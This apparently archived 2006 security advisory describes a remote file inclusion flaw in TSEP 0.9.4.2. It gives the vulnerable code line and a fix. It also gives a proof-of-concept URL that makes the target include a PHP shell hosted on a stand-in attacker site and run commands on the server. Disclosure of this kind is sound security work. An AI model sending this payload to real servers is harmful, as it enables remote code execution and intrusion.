@@ -1,0 +1,47 @@
++--------------------------------------------------------------------
++
++ TSEP 0.9.4.2
++
++--------------------------------------------------------------------
++
++ Affected Software .: TSEP 0.9.4.2
++ Venedor ...........: http://www.tsep.info/
++ Class .............: Remote File Inclusion
++ Risk ..............: high (Remote File Execution)
++ Found by ..........: Philipp Niedziela
++ Original advisory .: http://www.bb-pcsecurity.de/
++ Contact ...........: webmaster[at]bb-pcsecurity[.]de
++
++--------------------------------------------------------------------
++
++ Code /include/copyright.php:
++
++ .....
++ <?php require ( $tsep_config["absPath"]."/include/tsepversion.txt" ); ?>
++ .....
++
++--------------------------------------------------------------------
++
++ $tsep_config["absPath"] is not properly sanitized before being used
++
++--------------------------------------------------------------------
++
++ Solution:
++ Include config-File in copyright.php
++
++--------------------------------------------------------------------
++
++ PoC:
++ Place a PHPShell on a remote location:
++ http://evilsite.com/include/tsepversion.txt
++
++ http://[target]/include/copyright.php?tsep_config[absPath]=http://evilsite.com?cmd=ls
++
++--------------------------------------------------------------------
++
++ Greets:
++ Krini Gonzales (5 YEARS :P)
++
++-------------------------[ E O F ]----------------------------------
+
+# milw0rm.com [2006-08-01]
